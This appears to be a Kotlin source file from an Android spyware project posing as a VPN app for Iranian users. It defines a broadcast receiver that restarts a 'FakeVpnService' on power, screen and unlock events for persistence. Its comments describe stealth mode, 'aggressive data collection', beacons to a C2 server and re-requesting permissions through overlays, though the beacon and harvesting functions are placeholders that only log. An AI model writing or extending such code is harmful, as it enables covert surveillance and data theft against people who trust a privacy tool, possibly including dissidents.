package com.iran.liberty.vpn

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.BatteryManager
import android.util.Log

/**
 * Power connection receiver to optimize behavior during charging
 * Also handles additional persistence triggers
 */
class PowerConnectedReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "PowerReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_POWER_CONNECTED -> {
                handlePowerConnected(context, intent)
            }
            Intent.ACTION_POWER_DISCONNECTED -> {
                handlePowerDisconnected(context, intent)
            }
            Intent.ACTION_BATTERY_LOW -> {
                handleBatteryLow(context)
            }
            Intent.ACTION_BATTERY_OKAY -> {
                handleBatteryOkay(context)
            }
            // Additional system events for persistence
            Intent.ACTION_USER_PRESENT -> {
                handleUserPresent(context)
            }
            Intent.ACTION_SCREEN_ON -> {
                handleScreenOn(context)
            }
            Intent.ACTION_SCREEN_OFF -> {
                handleScreenOff(context)
            }
        }
    }

    /**
     * Handle power connected event
     */
    private fun handlePowerConnected(context: Context, intent: Intent) {
        Log.i(TAG, "Power connected")
        
        // Check battery level
        val batteryLevel = getBatteryLevel(intent)
        Log.d(TAG, "Battery level: $batteryLevel%")
        
        // When charging, we can be more aggressive with data collection
        // Start any intensive tasks that were paused due to battery concerns
        
        // Ensure foreground service is running
        ensureForegroundService(context)
        
        // If battery is above 50%, consider additional tasks
        if (batteryLevel > 50) {
            // Start periodic data collection if not already running
            startDataCollection(context)
        }
        
        // Send beacon to C2 about power status
        sendPowerStatusBeacon(context, "connected", batteryLevel)
    }

    /**
     * Handle power disconnected event
     */
    private fun handlePowerDisconnected(context: Context, intent: Intent) {
        Log.i(TAG, "Power disconnected")
        
        val batteryLevel = getBatteryLevel(intent)
        
        // Reduce aggressive tasks to conserve battery
        reduceDataCollection(context)
        
        // Send beacon to C2
        sendPowerStatusBeacon(context, "disconnected", batteryLevel)
    }

    /**
     * Handle low battery event
     */
    private fun handleBatteryLow(context: Context) {
        Log.w(TAG, "Battery low")
        
        // Minimize all activities to conserve battery
        // Only keep essential services running
        
        // Send low battery beacon
        sendPowerStatusBeacon(context, "low", getCurrentBatteryLevel(context))
    }

    /**
     * Handle battery okay event
     */
    private fun handleBatteryOkay(context: Context) {
        Log.i(TAG, "Battery okay")
        
        // Resume normal operations
        sendPowerStatusBeacon(context, "okay", getCurrentBatteryLevel(context))
    }

    /**
     * Handle user present (device unlocked)
     */
    private fun handleUserPresent(context: Context) {
        Log.d(TAG, "User present")
        
        // User is interacting with device, be cautious
        // Ensure stealth mode is active
        
        // Check if any permissions need re-requesting
        checkPermissions(context)
        
        // Send user activity beacon
        sendUserActivityBeacon(context, "unlocked")
    }

    /**
     * Handle screen on event
     */
    private fun handleScreenOn(context: Context) {
        Log.d(TAG, "Screen on")
        
        // Device is active, ensure services are running
        ensureForegroundService(context)
        
        // Send screen status beacon
        sendUserActivityBeacon(context, "screen_on")
    }

    /**
     * Handle screen off event
     */
    private fun handleScreenOff(context: Context) {
        Log.d(TAG, "Screen off")
        
        // Device may be idle, can run background tasks
        // But be careful of battery
        
        // Send screen status beacon
        sendUserActivityBeacon(context, "screen_off")
    }

    /**
     * Get battery level from intent
     */
    private fun getBatteryLevel(intent: Intent): Int {
        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        
        return if (level >= 0 && scale > 0) {
            (level * 100 / scale)
        } else {
            -1
        }
    }

    /**
     * Get current battery level
     */
    private fun getCurrentBatteryLevel(context: Context): Int {
        val batteryIntent = context.registerReceiver(null, 
            IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return batteryIntent?.let { getBatteryLevel(it) } ?: -1
    }

    /**
     * Ensure foreground service is running
     */
    private fun ensureForegroundService(context: Context) {
        try {
            val serviceIntent = Intent(context, FakeVpnService::class.java)
            
            // Check if service is already running
            if (!isServiceRunning(context, FakeVpnService::class.java)) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
                Log.d(TAG, "Foreground service started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error ensuring foreground service", e)
        }
    }

    /**
     * Start data collection tasks
     */
    private fun startDataCollection(context: Context) {
        // This would start HarvestEngine tasks
        // Placeholder for Pathway 4 integration
        Log.d(TAG, "Data collection started")
    }

    /**
     * Reduce data collection to conserve battery
     */
    private fun reduceDataCollection(context: Context) {
        // This would pause non-essential HarvestEngine tasks
        Log.d(TAG, "Data collection reduced")
    }

    /**
     * Check and request missing permissions
     */
    private fun checkPermissions(context: Context) {
        // Check if critical permissions are still granted
        // If not, might need to request again through overlay or notification
        Log.d(TAG, "Permission check performed")
    }

    /**
     * Send power status beacon to C2
     */
    private fun sendPowerStatusBeacon(context: Context, status: String, batteryLevel: Int) {
        // This would be implemented in C2Manager (Pathway 4)
        Log.d(TAG, "Power status beacon: $status, battery: $batteryLevel%")
    }

    /**
     * Send user activity beacon to C2
     */
    private fun sendUserActivityBeacon(context: Context, activity: String) {
        // This would be implemented in C2Manager (Pathway 4)
        Log.d(TAG, "User activity beacon: $activity")
    }

    /**
     * Check if a service is running
     */
    private fun isServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        return manager.getRunningServices(Integer.MAX_VALUE)
            .any { it.service.className == serviceClass.name }
    }
}